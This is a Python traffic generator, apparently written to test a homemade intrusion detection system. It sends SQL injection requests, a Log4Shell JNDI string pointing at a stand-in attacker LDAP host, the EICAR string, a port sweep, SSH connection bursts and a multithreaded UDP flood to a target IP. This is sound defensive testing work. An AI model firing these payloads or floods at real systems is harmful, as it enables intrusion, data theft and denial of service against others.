#!/usr/bin/env python3
"""
attack_simulator.py — Network Attack & Stress Test Simulator for DB-IDS/IPS

Designed to run either LOCALLY or from a SECOND LAPTOP on the same Wi-Fi / LAN.
Generates genuine TCP/UDP/HTTP attack signatures and high-rate stress traffic
to verify that the database-driven rules, DPI engine, and firewall blocklists fire.

Usage:
    python attack_simulator.py --target 10.30.201.26 --mode all
    python attack_simulator.py --target 10.30.201.26 --mode sqli
    python attack_simulator.py --target 10.30.201.26 --mode portscan
    python attack_simulator.py --target 10.30.201.26 --mode sshbrute
    python attack_simulator.py --target 10.30.201.26 --mode log4shell
    python attack_simulator.py --target 10.30.201.26 --mode flood --rate 2000
    python attack_simulator.py --target 10.30.201.26 --mode benign
"""

import sys
import time
import socket
import argparse
import threading
import http.client
from urllib.parse import quote

# ANSI Color Codes for terminal
C_RESET = "\033[0m"
C_BOLD = "\033[1m"
C_RED = "\033[91m"
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_BLUE = "\033[94m"
C_CYAN = "\033[96m"

def print_banner(target: str):
    print(f"{C_BOLD}{C_CYAN}================================================================={C_RESET}")
    print(f"{C_BOLD}{C_CYAN}   DB-IDS/IPS REAL-TIME ATTACK & STRESS TEST SIMULATOR           {C_RESET}")
    print(f"{C_BOLD}{C_CYAN}================================================================={C_RESET}")
    print(f"[*] Target IDS/IPS Host: {C_BOLD}{C_YELLOW}{target}{C_RESET}")
    print(f"[*] Local Hostname:      {socket.gethostname()}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target, 80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        local_ip = "127.0.0.1"
    print(f"[*] Attacker Source IP:  {C_BOLD}{C_GREEN}{local_ip}{C_RESET}")
    print(f"[*] Timestamp:           {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{C_CYAN}-----------------------------------------------------------------{C_RESET}\n")

# -----------------------------------------------------------------------------
# 1. SQL INJECTION (DPI Signature Test)
# -----------------------------------------------------------------------------
def test_sqli(target: str, port: int = 80):
    print(f"{C_BOLD}[TEST 1: DPI - SQL INJECTION]{C_RESET}")
    print(f"  Sending classic UNION SELECT SQLi exploit payload to HTTP port {port}...")
    payloads = [
        "GET /products.php?id=105%20UNION%20SELECT%20username,password%20FROM%20users%20--%20 HTTP/1.1",
        "GET /login.php?user=admin%27%20OR%201=1%20-- HTTP/1.1",
        "POST /api/search HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nquery=%27%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--"
    ]
    for p in payloads:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((target, port))
            req = f"{p}\r\nHost: {target}\r\nUser-Agent: Attacker-Test-Tool/1.0\r\nConnection: close\r\n\r\n"
            s.sendall(req.encode())
            try:
                s.recv(1024)
            except Exception:
                pass
            s.close()
            print(f"  {C_GREEN}[+] Transmitted SQLi packet:{C_RESET} {p.split()[1][:60]}...")
            time.sleep(0.3)
        except Exception as e:
            print(f"  {C_YELLOW}[!] Packet sent or intercepted:{C_RESET} {e}")
    print(f"  {C_BOLD}{C_GREEN}--> Expected Result: dpi_signatures table match -> Immediate Alert + IP Block in Redis/DB.{C_RESET}\n")

# -----------------------------------------------------------------------------
# 2. LOG4SHELL CVE-2021-44228 (DPI Signature Test)
# -----------------------------------------------------------------------------
def test_log4shell(target: str, port: int = 80):
    print(f"{C_BOLD}[TEST 2: DPI - LOG4SHELL RCE (CVE-2021-44228)]{C_RESET}")
    print(f"  Sending malicious JNDI LDAP lookup header to {target}:{port}...")
    payload = "${jndi:ldap://evil-ldap-server.attacker.com:1389/Exploit}"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        s.connect((target, port))
        req = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {target}\r\n"
            f"User-Agent: Mozilla/5.0 ({payload})\r\n"
            f"X-Api-Version: {payload}\r\n"
            f"Connection: close\r\n\r\n"
        )
        s.sendall(req.encode())
        try:
            s.recv(1024)
        except Exception:
            pass
        s.close()
        print(f"  {C_GREEN}[+] Transmitted JNDI payload header:{C_RESET} {payload}")
    except Exception as e:
        print(f"  {C_YELLOW}[!] Sent/Intercepted:{C_RESET} {e}")
    print(f"  {C_BOLD}{C_GREEN}--> Expected Result: dpi_signatures CVE-2021-44228 match -> CRITICAL alert.{C_RESET}\n")

# -----------------------------------------------------------------------------
# 3. EICAR STANDARD ANTIVIRUS TEST STRING
# -----------------------------------------------------------------------------
def test_eicar(target: str, port: int = 80):
    print(f"{C_BOLD}[TEST 3: DPI - EICAR TEST VIRUS SIGNATURE]{C_RESET}")
    eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        s.connect((target, port))
        req = f"POST /upload HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(eicar)}\r\n\r\n{eicar}"
        s.sendall(req.encode())
        s.close()
        print(f"  {C_GREEN}[+] Transmitted EICAR test string payload.{C_RESET}")
    except Exception as e:
        print(f"  {C_YELLOW}[!] Sent/Intercepted:{C_RESET} {e}")
    print(f"  {C_BOLD}{C_GREEN}--> Expected Result: dpi_signatures EXACT match -> MEDIUM alert.{C_RESET}\n")

# -----------------------------------------------------------------------------
# 4. PORT SCAN / SWEEP (Correlation Rule Test: TCP Port Sweep Scan)
# -----------------------------------------------------------------------------
def test_portscan(target: str):
    print(f"{C_BOLD}[TEST 4: CORRELATION - HORIZONTAL/VERTICAL PORT SCAN]{C_RESET}")
    ports_to_probe = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 5432, 6379, 8080, 8443, 9000]
    print(f"  Rapidly scanning {len(ports_to_probe)} distinct TCP ports on {target} within 3 seconds...")
    hits = 0
    for p in ports_to_probe:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.15)
            s.connect((target, p))
            hits += 1
            s.close()
        except Exception:
            pass
        sys.stdout.write(f"\r  Scanning port {p}... ")
        sys.stdout.flush()
        time.sleep(0.05)
    print(f"\n  {C_GREEN}[+] Completed sweep across {len(ports_to_probe)} ports.{C_RESET}")
    print(f"  {C_BOLD}{C_GREEN}--> Expected Result: correlation_rules 'TCP Port Sweep Scan' -> Threshold exceeded (>15 ports in 10s) -> AUTO BLOCK.{C_RESET}\n")

# -----------------------------------------------------------------------------
# 5. SSH BRUTE FORCE (Correlation Rule Test: SSH Brute Force Detection)
# -----------------------------------------------------------------------------
def test_sshbrute(target: str, port: int = 22):
    print(f"{C_BOLD}[TEST 5: CORRELATION - SSH BRUTE FORCE BURST]{C_RESET}")
    print(f"  Firing 8 rapid TCP SYN handshake connections to SSH port {port}...")
    for i in range(1, 9):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((target, port))
            # Send fake SSH client banner
            s.sendall(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n")
            s.close()
            print(f"  {C_GREEN}[+] Connection #{i}: SSH handshake initiated{C_RESET}")
        except Exception as e:
            print(f"  {C_YELLOW}[!] Connection #{i}: Blocked or Refused ({e}){C_RESET}")
        time.sleep(0.1)
    print(f"  {C_BOLD}{C_GREEN}--> Expected Result: correlation_rules 'SSH Brute Force Detection' (>5 in 60s) -> Triggers Playbook 1 (Block IP + Capture PCAP).{C_RESET}\n")

# -----------------------------------------------------------------------------
# 6. HIGH-RATE STRESS FLOOD (Benchmarking & Throughput Test)
# -----------------------------------------------------------------------------
def test_flood(target: str, port: int = 80, duration_seconds: int = 5, workers: int = 8):
    print(f"{C_BOLD}[TEST 6: STRESS TEST - HIGH-VOLUME PACKET FLOOD]{C_RESET}")
    print(f"  Target: {target}:{port} | Threads: {workers} | Duration: {duration_seconds}s")
    
    stop_event = threading.Event()
    total_packets = [0]
    lock = threading.Lock()

    def flood_worker():
        local_count = 0
        while not stop_event.is_set():
            try:
                # Rapid UDP packet burst for maximum packet-per-second stress
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = b"STRESS_TEST_PACKET_BURST_DB_IDS_IPS_BENCHMARK_1234567890" * 4
                s.sendto(payload, (target, port))
                s.close()
                local_count += 1
            except Exception:
                pass
        with lock:
            total_packets[0] += local_count

    threads = []
    start_time = time.time()
    for _ in range(workers):
        t = threading.Thread(target=flood_worker, daemon=True)
        threads.append(t)
        t.start()

    # Progress bar during flood
    for elapsed in range(duration_seconds):
        time.sleep(1.0)
        print(f"  Flooding... {elapsed + 1}/{duration_seconds}s elapsed...")

    stop_event.set()
    for t in threads:
        t.join(timeout=1.0)

    total_time = max(0.1, time.time() - start_time)
    pps = int(total_packets[0] / total_time)
    print(f"  {C_BOLD}{C_GREEN}[+] Finished Stress Flood:{C_RESET} {total_packets[0]} packets sent in {total_time:.2f}s (~{pps:,} packets/sec)")
    print(f"  {C_BOLD}{C_GREEN}--> Check: Redis O(1) filter performance & PostgreSQL/MongoDB ingestion tables.{C_RESET}\n")

# -----------------------------------------------------------------------------
# 7. BENIGN BACKGROUND TRAFFIC (For Real-Time Dashboard Charts)
# -----------------------------------------------------------------------------
def test_benign(target: str):
    print(f"{C_BOLD}[TEST 7: BENIGN NORMAL TRAFFIC GENERATOR]{C_RESET}")
    print(f"  Generating normal web & DNS activity so dashboard graphs populate...")
    endpoints = ["/", "/index.html", "/health", "/api/stats", "/docs"]
    for ep in endpoints:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((target, 80))
            req = f"GET {ep} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n"
            s.sendall(req.encode())
            s.close()
            print(f"  {C_CYAN}[Normal Traffic]{C_RESET} GET {ep}")
        except Exception:
            pass
        time.sleep(0.2)
    print(f"  {C_GREEN}[+] Normal traffic recorded in sessions table.{C_RESET}\n")

# -----------------------------------------------------------------------------
# CLI Entry Point
# -----------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="DB-IDS/IPS Attack & Stress Simulator")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP running DB-IDS/IPS (e.g. 10.30.201.26)")
    parser.add_argument("--port", type=int, default=5000, help="Target service port (default: 5000)")
    parser.add_argument("--mode", default="all", choices=["all", "sqli", "log4shell", "eicar", "portscan", "sshbrute", "flood", "benign"],
                        help="Attack pattern to simulate")
    parser.add_argument("--flood-duration", type=int, default=5, help="Seconds to run flood stress test")
    parser.add_argument("--flood-threads", type=int, default=8, help="Number of concurrent flooding threads")
    args = parser.parse_args()

    print_banner(args.target)

    if args.mode in ("all", "benign"):
        test_benign(args.target)
    if args.mode in ("all", "sqli"):
        test_sqli(args.target, args.port)
    if args.mode in ("all", "log4shell"):
        test_log4shell(args.target, args.port)
    if args.mode in ("all", "eicar"):
        test_eicar(args.target, args.port)
    if args.mode in ("all", "portscan"):
        test_portscan(args.target)
    if args.mode in ("all", "sshbrute"):
        test_sshbrute(args.target)
    if args.mode in ("all", "flood"):
        test_flood(args.target, args.port, duration_seconds=args.flood_duration, workers=args.flood_threads)

    print(f"{C_BOLD}{C_CYAN}================================================================={C_RESET}")
    print(f"{C_BOLD}{C_GREEN}   TEST RUN COMPLETED SUCCESSFULLY!                              {C_RESET}")
    print(f"{C_BOLD}{C_CYAN}================================================================={C_RESET}")
    print(f"1. Open the React GUI at: {C_BOLD}http://localhost:3000{C_RESET} (or http://{args.target}:3000)")
    print(f"2. Check 'Alert Feed' tab for incoming fired alerts in real time.")
    print(f"3. Check 'Threat Intelligence' -> 'Active Blocklist' to see blocked IPs.")
    print(f"4. Check 'Session Inspector' to see all captured packet sessions.")
    print(f"5. Check 'Forensics' to view MongoDB raw hex packet dumps.\n")

if __name__ == "__main__":
    main()
